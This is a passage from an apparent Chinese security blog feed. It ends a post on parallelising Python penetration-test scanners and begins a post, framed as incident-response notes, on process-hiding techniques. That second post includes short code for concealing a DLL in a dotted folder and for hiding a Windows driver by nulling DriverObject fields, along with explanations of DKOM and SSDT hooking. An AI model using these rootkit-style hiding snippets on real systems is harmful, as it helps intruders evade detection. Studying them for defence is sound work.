&lt;ul&gt;
  &lt;li&gt;fork&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;教科书式的的案例，曾收录在不少经典编程书籍里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/env python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) start...'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'I am child process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) and my parent is &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getppid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'I (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) just created a child process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s).'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing的多进程&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/env python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;multiprocessing&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Run child process &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)...'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Parent process &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process will start.'&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process end.'&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing下的多线程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在multiprocessing下也有个多线程模块,通过async_result.get()可以获取结果。&lt;/p&gt;

&lt;p&gt;multiprocessing也能实现多线程，它有两个多线程的入口，一个是 dummy Pool：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# -*- coding: utf-8 -*-
# from multiprocessing import Pool 多进程
from multiprocessing.dummy import Pool as ThreadPool #多线程
import time
import urllib2
 
urls = [
    'http://www.python.org', 
    'http://www.python.org/about/',
    'http://www.onlamp.com/pub/a/python/2003/04/17/metaclasses.html',
    ]
 
# 单线程
start = time.time()
results = map(urllib2.urlopen, urls)
print 'Normal:', time.time() - start
 
# 多线程
start2 = time.time()
# 开4个 worker，没有参数时默认是 cpu 的核心数
pool = ThreadPool(4)
# 在线程中执行 urllib2.urlopen(url) 并返回执行结果
results2 = pool.map(urllib2.urlopen, urls)
pool.close()
pool.join()
print 'Thread Pool:', time.time() - start2

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;另一个是pool.ThreadPool：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from multiprocessing.pool import ThreadPool
 
def foo(bar, baz):
  print 'hello {0}'.format(bar)
  return 'foo' + baz
 
pool = ThreadPool(processes=1)
 
async_result = pool.apply_async(foo, ('xiaorui.cc', 'foo',))

return_val = async_result.get()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;进程池&quot;&gt;进程池&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing进程池&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注意下面代码的注释，apply_async和apply函数，前者是非阻塞的，后者是阻塞。可以看出运行时间相差的倍数正是进程池数量。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import multiprocessing
import time

def func(msg):
    print &quot;msg:&quot;, msg
    time.sleep(3)
    print &quot;end&quot;
    return &quot;done&quot; + msg

if __name__ == &quot;__main__&quot;:
    pool = multiprocessing.Pool(processes=4)
    result = []
    for i in xrange(3):
        msg = &quot;hello %d&quot; %(i)
        #result.append(pool.apply(func, (msg, )))
		result.append(pool.apply_async(func, (msg, )))
    pool.close()
    pool.join()
    for res in result:
        print &quot;:::&quot;, res.get()
    print &quot;Sub-process(es) done.&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;封装库&quot;&gt;封装库&lt;/h3&gt;

&lt;p&gt;网上还有一些通过封装多进程、多线程、队列组合成的第三方库，也能达到比较好的效果，这种库对于细节的优化较好。&lt;/p&gt;

&lt;p&gt;下面是某个第三方库的代码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding=utf-8

import threading
import Queue

from billiard.dummy import DummyProcess

class work(DummyProcess):
    def __init__(self, workQueue, result_queue, timeout=5, **kwargs):
        self.timeout = timeout
        self.result_queue = result_queue
        self.isRunning = False
        self.workQueue = workQueue
        DummyProcess.__init__(self, kwargs=kwargs)


    def stop(self):
        self.isRunning = False

    def run(self):
        self.isRunning = True
        while self.isRunning:
            try:
                func, args, kwargs = self.workQueue.get(timeout=self.timeout)
                result = apply(func, *args, **kwargs)
                self.workQueue.task_done()
                self.result_queue.put(result, False)
            except Queue.Empty:
                self.isRunning = False
            except:
                pass

class ThreadPool:
    def __init__(self, num_of_threads=10):
        self.workQueue = Queue.Queue()
        self.result_queue = Queue.Queue()
        self.threads = []

        for i in range(num_of_threads):
            thread = work(self.workQueue, self.result_queue)
            self.threads.append(thread)

    def add_job(self, fun, *args, **kwargs):
        self.workQueue.put((fun, args, kwargs))
    
    def get_result(self):
        results = []
        try:
            while True:
                result = self.result_queue.get(block=False)
                results.append(result)
        except Exception,e:
            print str(e)
        finally:
            return results

    def start(self):
        try:
            for t in self.threads:
                t.start()
        except:
            self.stop()

    def stop(self):
        for t in self.threads:
            t.stop()

    def wait_for_complete(self):
        try:
            for t in self.threads:
                while t.isAlive():
                    t.join(10)

        except KeyboardInterrupt:
            self.stop()
            print


if __name__ == &quot;__main__&quot;:
    tp = ThreadPool(20)
    for line in open('target.txt').readlines():
        evil = Evil_Class(line)
        tp.add_job(evil.run)
    tp.start()
    try:
        tp.wait_for_complete()
        resp = tp.get_result()
    except KeyboardInterrupt:
        tp.stop()


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;分布式任务&quot;&gt;分布式任务&lt;/h3&gt;

&lt;p&gt;对于分布式任务的话，配置起来会比较麻烦。比如你就一台PC或者破VPS，还想搞多节点分布式任务，显然吃饱了撑着没事干。&lt;/p&gt;

&lt;p&gt;分布式的优点的话，主要在于其可扩展性，理论上只要消息中间件和容错机制足够稳健，带宽足够高，就能最大化提升扫描器的性能。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;celery&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;celery是一个国外的分布式调度框架，在扫描器方面，我们可以采用几种方案：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;单机器 + 多节点 + 线/进程池&lt;/li&gt;
    &lt;li&gt;多机器 + 多节点 + 线/进程池&lt;/li&gt;
    &lt;li&gt;多机器 + 多节点&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;前两条对扫描器性能提升确实是有的，但如果个别网络任务如果耗时较长的话，会持续占用进而耗尽节点的资源。
即使每条任务里，我们都会尽可能提升进程/线程数，但如果其中仍然包含有多级网络任务调用，那么扫描的速率也不会有太大的提升。因为除了机器资源以外，扫描器还会受带宽、网卡出口等其他因素的影响。&lt;/p&gt;

&lt;p&gt;如果我们遵循第三条，最大化利用celery节点运行任务，将所有线/进程池尽可能替换，则会是另一个场景。
当每一个插件或者fuzz脚本，都作为单条任务去运行时，容错机制会及时结束掉每一个失败/超时的任务。在我们做好中间件和存储的灾备机制的前提下，扫描器将会变得更加稳健。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;bugscan&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当然，业内也有小伙伴做出了基于rpc通信的异步任务管理框架，如bugscan。&lt;/p&gt;

&lt;p&gt;其节点有三个核心：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Service: rpc client, 负责与server通信, 获取任务插件，发送报告等操作。
Task_Manager: 任务管理器, 执行添加，删除任务的操作。
Task: 获取插件，执行任务，输出报告。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其运作的大概流程，这里就直接复制别人的分析报告了：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;无限循环 -&amp;gt; service 获取任务列表 -&amp;gt; 是否有待执行的任务 -&amp;gt; 发送至 task_manager -&amp;gt; 添加任务 -&amp;gt; 调用 task -&amp;gt; task 执行任务 -&amp;gt; service 设置任务状态 -&amp;gt; 是否返回报告 -&amp;gt; service 发送报告 -&amp;gt; 是否有待停止的任务 -&amp;gt; 发送至 task_manager -&amp;gt; 删除任务 -&amp;gt; 调用 task -&amp;gt; task 停止任务 -&amp;gt; service 设置任务状态 -&amp;gt; 无限循环
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;有兴趣的朋友可以看看原文，这是关于bugscan的一篇详细分析：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.chabug.org/tools/553.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;多种其他异步任务框架&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;相似的框架还是蛮多的，就不一一列举了。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;dramatiq&lt;/li&gt;
  &lt;li&gt;sidekiq&lt;/li&gt;
  &lt;li&gt;huey&lt;/li&gt;
  &lt;li&gt;thriftpy&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;总而言之，只要我们合理利用可以加速的库，可以更好地打造我们的扫描器。本文聊的内容比较基础，接下来的文章里，笔者打算通过细分领域，重点拿经典项目的案例进行剖析。&lt;/p&gt;

&lt;h3 id=&quot;参考文章&quot;&gt;参考文章&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/xiaozi/p/6182990.html&quot;&gt;python线程池（threadpool）模块使用笔记&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/zhang293/p/7954353.html&quot;&gt;多种方法实现 python 线程池&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://xiaorui.cc/2015/11/03/%E7%90%86%E8%A7%A3python%E7%9A%84multiprocessing-pool-threadpool%E5%A4%9A%E7%BA%BF%E7%A8%8B/&quot;&gt;理解python的multiprocessing.pool threadpool多线程&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ns2250225/article/details/48755741&quot;&gt;使用 multiprocessing.dummy 执行多线程任务&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/lxmhhy/p/6052167.html&quot;&gt;python 多进程使用总结&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/PrettyTom/p/6582357.html&quot;&gt;Python的多进程&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.chabug.org/tools/553.html&quot;&gt;[X1r0z]模拟bugscan node的通信机制及在线体验
&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。</summary></entry><entry><title type="html">浅谈进程隐藏之术</title><link href="/cert/2018/07/04/hide-process/" rel="alternate" type="text/html" title="浅谈进程隐藏之术" /><published>2018-07-04T19:30:38+08:00</published><updated>2018-07-04T19:30:38+08:00</updated><id>/cert/2018/07/04/hide-process</id><content type="html" xml:base="/cert/2018/07/04/hide-process/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;windows进程隐藏&quot;&gt;windows进程隐藏&lt;/h3&gt;

&lt;h4 id=&quot;基于系统服务的进程隐藏技术&quot;&gt;基于系统服务的进程隐藏技术&lt;/h4&gt;

&lt;p&gt;在WIN 9X系列操作系统中, 系统进程列表中不能看到任何系统服务进程, 因此只需要将指定进程注册为系统服务就能够使该进程从系统进程列表中隐形。&lt;/p&gt;

&lt;p&gt;在WIN 9X下用RegisterServiceProcess函数隐藏进程，NT架构下用不了 即win2000和xp等什么的用不了此方法。&lt;/p&gt;

&lt;p&gt;替换tasklist、ps、top
https://blog.csdn.net/qq_27446553/article/details/54591099
windows高版本内核难以进行真正的进程隐藏，除非编写底层驱动。
在进程LoadLibrary某个DLL文件后，这个DLL是不可以被删除的，但是可以改名和移动位置（当然，就算移动了位置也不可以删除它），所以代码中可以用MoveFile移动到某个角落去。
这样，DLL就从原来的位置消失了，而新位置在资源管理器中又无法访问到，达到了简单隐藏DLL的目的。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CreateDirectory('d:\test\....\', nil);
MoveFile('D:\test\Hack.dll', 'd:\test\....\Hack.dll');
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;基于api-hook的进程隐藏技术&quot;&gt;基于API HOOK的进程隐藏技术&lt;/h4&gt;

&lt;p&gt;API HOOK指的是通过特殊的编程手段截获WINDOWS系统调用的API函数,并将其丢弃或者进行替换。 通过API
HOOK编程方法,截获系统遍历进程函数并对其进行替换,可以实现对任意进程的隐藏。&lt;/p&gt;

&lt;h4 id=&quot;基于-dll-的进程隐藏技术远程注入dll技术&quot;&gt;基于 DLL 的进程隐藏技术:远程注入Dll技术&lt;/h4&gt;

&lt;p&gt;先编写一个API的DLL，将它远程注入进程，写入远程进程的内存地址空间，并建立远程线程执行。&lt;/p&gt;

&lt;p&gt;不触发PG（patchguard），又能隐藏驱动：
当驱动加载时 会将驱动信息加入那个链表，可以直接阻止这个加入的过程。
“MiProcessLoaderEntry”，这个函数将驱动信息加入链表和移除链表：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;调用MiProcessLoaderEntry(pDriverObject-&amp;gt;DriverSection, 0);
PCHunter显示为红色~

能不能完全隐藏?
pTargetDriverObject-&amp;gt;DriverSection = NULL;

// 破坏驱动对象特征
pTargetDriverObject-&amp;gt;DriverStart = NULL;
pTargetDriverObject-&amp;gt;DriverSize = NULL;
pTargetDriverObject-&amp;gt;DriverUnload = NULL;
pTargetDriverObject-&amp;gt;DriverInit = NULL;
pTargetDriverObject-&amp;gt;DeviceObject = NULL;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;基于远程线程注入代码的进程隐藏技术&quot;&gt;基于远程线程注入代码的进程隐藏技术&lt;/h4&gt;

&lt;p&gt;这种方法与远程线程注入DLL的原理一样,都是通过在某进程中创建远程线程来共享该进程的内存空间。&lt;/p&gt;

&lt;p&gt;所不同的是,远程线程注入代码通过直接拷贝程序代码到某进程的内存空间来达到注入的目的。&lt;/p&gt;

&lt;p&gt;因为程序代码存在于内存中,不仅进程列表中无法检测,即使遍历进程加载的内存模块也无法找到被隐藏程序的踪迹。&lt;/p&gt;

&lt;h4 id=&quot;rootkit方式&quot;&gt;Rootkit方式&lt;/h4&gt;

&lt;p&gt;Intel CPU 有4 个特权级别： Ring 0， Ring 1， Ring 2， Ring 3。Windows 只使用了其中的 Ring  0 和  Ring  3 两个级别。&lt;/p&gt;

&lt;p&gt;操作系统分为内核和外壳两部分：内核运行在Ring0级，通常称为核心态（或内核态），用于实现最底层的管理功能，在内核态可以访问系统数据和硬件，包括处理机调度、内存管理、设备管理、文件管理等；外壳运行在 Ring 3级，通常称为用户态，是基于内核提供的交互功能而存在的界面，它负责指令传递和解释。通常情况下，用户态的应用程序没有权限访问核心态的地址空间。&lt;/p&gt;

&lt;p&gt;Rootkit 是攻击者用来隐藏自己的踪迹和保留 root 访问权限的工具，它能使攻击者一直保持对目标机器的访问，以实施对目标计算机的控制[1]。从 Rootkit 运行的环境来看，可将
其分为用户级 Rootkit 和内核级 Rootkit。
用户态下，应用程序会调用 Win32 子系统动态库（包括Kernel32.dll， User32.dll， Gdi32.dll等）提供的Win32 API函数，它们是Windows提供给应用程序与操作系统的接口，运行在Ring3级。用户级 Rootkit 通常就是通过拦截 Win32 API，建立系统钩子，插入自己的代码，从而控制检测工具对进程或服务的遍历调用，实现隐藏功能。&lt;/p&gt;

&lt;p&gt;内核级Rootkit 是指利用驱动程序技术或其它相关技术进入Windows 操作系统内核，通过对 Windows 操作系统内核相关的数据结构或对象进行篡改，以实现隐藏功能。&lt;/p&gt;

&lt;p&gt;由于Rootkit运行在Ring0级别，甚至进入内核空间，因而可以对内核指令进行修改，而用户级检测却无法发现内核操作被拦
截。
下面介绍两种使用Rootkit技术来实现进程隐藏的方法。注册表来实现启动,因而易于被检测出来。显然,要增强进程的隐蔽性,关键在于增强加载程序文件的隐藏性。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;SSDT Hook&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;参考资料：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;进程隐藏与进程保护（SSDT Hook 实现）（一）
http://www.cnblogs.com/zmlctt/p/3979105.html

进程隐藏与进程保护（SSDT Hook 实现）（二）
https://www.cnblogs.com/zmlctt/p/3979108.html

进程隐藏与进程保护（SSDT Hook 实现）（三）
http://www.cnblogs.com/BoyXiao/archive/2011/09/05/2168115.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;DKOM（Direct Kernel Object Manipulation，直接内核对象操作）&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;使用DKOM方法进行进程隐藏。在Windows操作系统中，系统会为每一个活动进程创建一个进程对象EPROCESS，为进程中的每一个线程创建一个线程对象 ETHREAD。

在 EPROCESS 进程结构中有个双向链表 LIST_ENTRY，LIST_ENTRY结构中有FLINK 和BLINK 两个成员指针，分别指向当前进程的前驱进程和后继进程。

如果要隐藏当前进程，只需把当前进程的前驱进程的BLINK 修改为当前进程的BLINK，再把当前进程的后继进程的FLINK修改为当前进程的FLINK。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;关于断链隐藏进程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Windows系统中的所有进程通过其ActiveProcessLinks结构中的指针来引用。它们构成了诸如taskmgr.exe（任务管理器）或某些SysInternals（例如procexp.exe）等工具使用的双链表。&lt;/p&gt;

&lt;p&gt;DKOM技术【直接内核对象操纵（Direct Kernel Object Manipulation）】隐藏了一个取消链接它自己的ActiveProcessLinks的进程，并将“前一个”和“下一个”进程直接相互链接。
事实上，许多监控/系统工具（例如SysInternals Microsoft套件）都是基于双链表的进程枚举。&lt;/p&gt;

&lt;p&gt;不过断链隐藏进程，容易蓝屏，貌似也过不了pg。&lt;/p&gt;

&lt;h3 id=&quot;linux进程隐藏&quot;&gt;Linux进程隐藏&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;一种简单的方法：系统启动时会依据 /etc/fstab 文件内容来挂载分区，在 proc 分区挂载参数中加入 hidepid=2 参数后，登陆系统的用户只能查看到当前用户启动的进程的信息。也就是说， tomcat 用户只能看到属于 tomcat 用户进程的信息。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
